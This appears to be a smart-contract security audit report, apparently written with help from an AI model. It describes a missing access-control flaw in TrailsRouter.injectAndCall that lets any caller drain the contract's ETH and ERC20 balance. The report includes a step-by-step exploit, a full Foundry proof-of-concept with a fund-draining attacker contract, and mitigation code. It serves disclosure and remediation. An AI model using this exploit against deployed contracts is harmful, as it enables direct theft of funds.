# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
using gpt-5.1 "none"


 **Derived From** : Anyone can arbitrarily spend entire TrailsRouter token/ETH balance via injectAndCall

[M-1]. Unrestricted injectAndCall lets any user spend entire TrailsRouter ETH/ERC20 balances via arbitrary target call
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 1
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Anyone can arbitrarily spend entire TrailsRouter token/ETH balance via injectAndCall

## [M-1]. Unrestricted injectAndCall lets any user spend entire TrailsRouter ETH/ERC20 balances via arbitrary target call

### Finding Severity Justification: injectAndCall is publicly callable and not guarded by onlyDelegatecall, yet it uses the contract’s own balance (address(this)) to approve/spend tokens or forward ETH to an arbitrary target. This allows anyone to drain any ETH/ERC20 held by the TrailsRouter implementation. While the protocol is intended to be stateless and not hold funds, in practice balances can exist (accidental transfers, dust, or leftovers from direct pull* flows). The impact is direct theft of assets held by the contract, but those assets are not meant to be core user funds under normal design, hence Medium rather than High.
## Derived From Pattern/Invariant
Anyone can arbitrarily spend entire TrailsRouter token/ETH balance via injectAndCall

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The TrailsRouter contract exposes a public `injectAndCall` function that is **not** restricted by `onlyDelegatecall` or any other access control, yet it uses the router’s **own** token/ETH balance (`address(this)`) as the injected amount. This effectively lets any caller cause the router to send or approve its full balance of a given token/ETH to an arbitrary `target`.

Relevant code:
```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _getSelfBalance(address token) internal view returns (uint256) {
    return _getBalance(token, address(this));
}

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional placeholder replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```
Key points:
- `injectAndCall` is `public payable` and **not** guarded by `onlyDelegatecall`.
- It reads `callerBalance` from `_getSelfBalance(token)`, i.e., the balance of the **router contract itself**, not `msg.sender`.
- For ERC20 tokens, `_injectAndExecuteCall` calls `SafeERC20.forceApprove(erc20, target, callerBalance)` and then `target.call(callData)`. This gives `target` an allowance equal to the router’s entire token balance.
- For ETH, `_injectAndExecuteCall` calls `target.call{value: callerBalance}(callData)`, forwarding the router’s entire ETH balance.

If the router contract ever holds ETH or ERC20 tokens (e.g., accidental transfers, misconfigured integrations, or dust from other flows), any attacker can:
1. Call `injectAndCall` with `token` set to an ERC20/ETH that has a non-zero balance on the router.
2. Set `target` to an attacker-controlled contract.
3. Provide `callData` that uses the granted allowance (for ERC20) or received ETH to transfer those funds to the attacker.

This is a classic missing access control/auth-bypass issue: a helper meant to be used only in delegatecall/wallet context is callable directly on the router implementation and acts on its own holdings. The fact that the router is designed to be "stateless" does not eliminate risk: in production, it is common for contracts to receive mistaken transfers or for integrators to mis-route funds.


## Impact
Any ERC20 tokens or ETH held by the TrailsRouter implementation contract can be drained by an arbitrary EOA/contract. This includes accidentally sent funds, misrouted protocol funds, or any balance that accumulates over time, leading to direct theft of those assets.

## Command to Run Test


## Proof of Concept
1. Assume the deployed TrailsRouter contract at address `router` has accidentally received 1000 tokens of `TestToken` and 5 ETH (e.g., from mistaken transfers or misconfigured integrations).
2. The attacker deploys a simple `DrainTarget` contract with a function `drain(address token)` that:
   - If `token == address(0)`, immediately forwards all received ETH to the attacker EOA.
   - Else, calls `IERC20(token).transferFrom(msg.sender, attacker, IERC20(token).balanceOf(msg.sender))` to pull all approved tokens from the caller (which will be the router).
3. The attacker calls `router.injectAndCall(TestToken, DrainTarget, callDataForDrain, 0, 0)` with:
   - `target = DrainTarget` address.
   - `token = TestToken`.
   - `amountOffset = 0`, `placeholder = 0` (no injection needed).
   - `callData` encoding `DrainTarget.drain(TestToken)`.
4. Inside `injectAndCall`, `callerBalance` will be `_getSelfBalance(TestToken)` = 1000.
5. `_injectAndExecuteCall`:
   - Calls `forceApprove(TestToken, DrainTarget, 1000)` on the router.
   - Calls `DrainTarget.drain(TestToken)` from the router context.
6. `DrainTarget.drain(TestToken)` executes `transferFrom(router, attacker, 1000)`, pulling all 1000 tokens from the router to the attacker.
7. Similarly, the attacker can repeat with `token = address(0)` and `callData` that triggers a function on `DrainTarget` that accepts ETH and forwards it to the attacker, draining the router’s ETH balance.

This attack does not require any special privileges, only knowledge of the router address and its token/ETH holdings.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TT") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract DrainTarget {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // For ERC20 drain
    function drainToken(address token) external {
        uint256 bal = ERC20(token).balanceOf(msg.sender);
        ERC20(token).transferFrom(msg.sender, attacker, bal);
    }

    // For ETH drain
    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}

contract InjectAndCallAuthBypassTest is Test {
    TrailsRouter router;
    TestToken token;
    DrainTarget drainTarget;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();
        drainTarget = new DrainTarget(attacker);

        // Fund the router with ERC20 and ETH as if by mistake
        token.transfer(address(router), 1_000 ether);
        vm.deal(address(router), 5 ether);

        // Sanity check balances
        assertEq(token.balanceOf(address(router)), 1_000 ether);
        assertEq(address(router).balance, 5 ether);
    }

    function test_AttackerDrainsRouterERC20ViaInjectAndCall() public {
        vm.startPrank(attacker);

        // encode call to DrainTarget.drainToken(token)
        bytes memory data = abi.encodeWithSelector(DrainTarget.drainToken.selector, address(token));

        // attacker calls injectAndCall; no placeholder replacement needed
        router.injectAndCall(address(token), address(drainTarget), data, 0, bytes32(0));

        vm.stopPrank();

        // Router's ERC20 balance should now be 0; attacker received tokens
        assertEq(token.balanceOf(address(router)), 0);
        assertEq(token.balanceOf(attacker), 1_000 ether);
    }

    function test_AttackerDrainsRouterETHViaInjectAndCall() public {
        // attacker contract to receive ETH via fallback
        vm.startPrank(attacker);

        // For ETH case, token == address(0), and we just trigger DrainTarget's receive by empty calldata
        bytes memory data = hex""; // will not revert; receive() handles ETH

        router.injectAndCall(address(0), address(drainTarget), data, 0, bytes32(0));

        vm.stopPrank();

        // Router's ETH balance should now be 0; attacker contract ultimately holds ETH and forwards to attacker
        assertEq(address(router).balance, 0);
        assertGt(attacker.balance, 0);
    }
}


## Suggested Mitigation
If `injectAndCall` is intended **only** for delegatecall use within Sequence wallets, restrict it with the `onlyDelegatecall` modifier (as is done for `sweep`, `refundAndSweep`, and `validateOpHashAndSweep`):

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable onlyDelegatecall {
    // unchanged body
}
```

Alternatively, if it must remain callable directly, change its semantics to use the caller’s balance rather than the router’s own balance, i.e.:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getBalance(token, msg.sender);
    // transferFrom / pull from msg.sender first, then approve/spend that amount
}
```

and carefully document that this function is for per-caller sweep/injection, not for spending the router’s holdings. In all cases, avoid using `_getSelfBalance` in a publicly callable function without access control.



